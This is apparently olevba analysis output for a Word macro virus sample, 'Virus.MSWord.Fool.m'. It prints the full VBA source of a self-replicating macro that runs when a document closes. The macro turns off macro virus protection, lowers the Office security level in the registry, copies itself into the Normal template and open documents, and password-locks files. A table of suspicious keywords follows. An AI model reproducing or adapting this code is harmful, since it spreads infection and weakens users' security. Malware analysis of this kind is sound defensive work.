olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetTickCount Lib "Kernel32" () As Long
Private Sub Document_Close()
' WalruS Virus 11/00
    On Error Resume Next
    If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
    DropPath = ("C:\WalruS.drv")
    RunTime = Format(GetTickCount / 60000, "0")
    VBProject.VBComponents(1).Export DropPath
    Set nt = NormalTemplate.VBProject.VBComponents(1).CodeModule: Set ad = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Options.VirusProtection = False: Options.SaveNormalPrompt = False: Application.DisplayStatusBar = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "WalruS"
    If nt.CountOfLines = 0 Then
        nt.AddFromFile DropPath: nt.DeleteLines 1, 4: nt.replaceline 30, " Sub ToolsMacro(): End Sub"
    End If
    If ad.CountOfLines = 0 Then
        ad.AddFromFile DropPath: ad.DeleteLines 1, 4: ad.replaceline 30, " Sub ViewVBCode(): End Sub"
        ActiveDocument.Save
    End If
    If RunTime > 300 Then
        Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
        ActiveDocument.Shapes.AddTextEffect(msoTextEffect29, "The WalruS", _
            "Arial Black", 72#, msoFalse, msoFalse, 73.75, 129.3).Select
        ActiveDocument.Protect Password:=Application.UserName, NoReset:=False, Type:= _
            wdAllowOnlyComments
        ActiveDocument.Save
    End If
    Kill DropPath
End Sub
 Sub ViewVBCode(): End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

